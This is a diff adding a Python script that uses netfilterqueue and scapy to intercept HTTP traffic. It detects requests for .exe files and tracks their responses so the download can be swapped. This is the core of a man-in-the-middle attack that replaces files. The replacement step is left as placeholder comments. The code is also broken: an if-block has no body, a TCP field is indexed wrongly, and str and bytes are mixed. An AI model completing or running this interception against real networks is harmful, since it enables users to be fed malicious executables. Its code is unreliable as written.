@@ -1,0 +1,35 @@
+#!/usr/bin/env python
+
+# modifies data in http layer using scapy
+
+import netfilterqueue
+import scapy.all as scapy
+
+ack_list = []
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        # within the TCP field, look for the dest port, http is 80 , numerically (request leaving comp)
+        if scapy_packet[scapy.TCP].dport == 80:
+            print("Detecting HTTP request")
+            if ".exe" in scapy_packet[scapy.Raw].load:
+            # if a .exe file is found in the packet's load area [RAW] , load = ....
+            # placeholder for running something when .exe is detected
+            ack_list.append(scapy_packet[scapy.TCP.ack])
+            # store the ack info from the TCP layer in the ack_list arr.
+            print(scapy_packet.show())
+        elif scapy_packet[scapy.TCP].sport == 80:
+            print("HTTP response")
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                # if the .seq on response matches .ack from the request...
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                # Make sure to remove the seq after identifying it so we clear out the arr.
+                print("Replacing target file....")
+                print(scapy_packet.show())
+                # run replacement program
+
+    packet.accept()
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
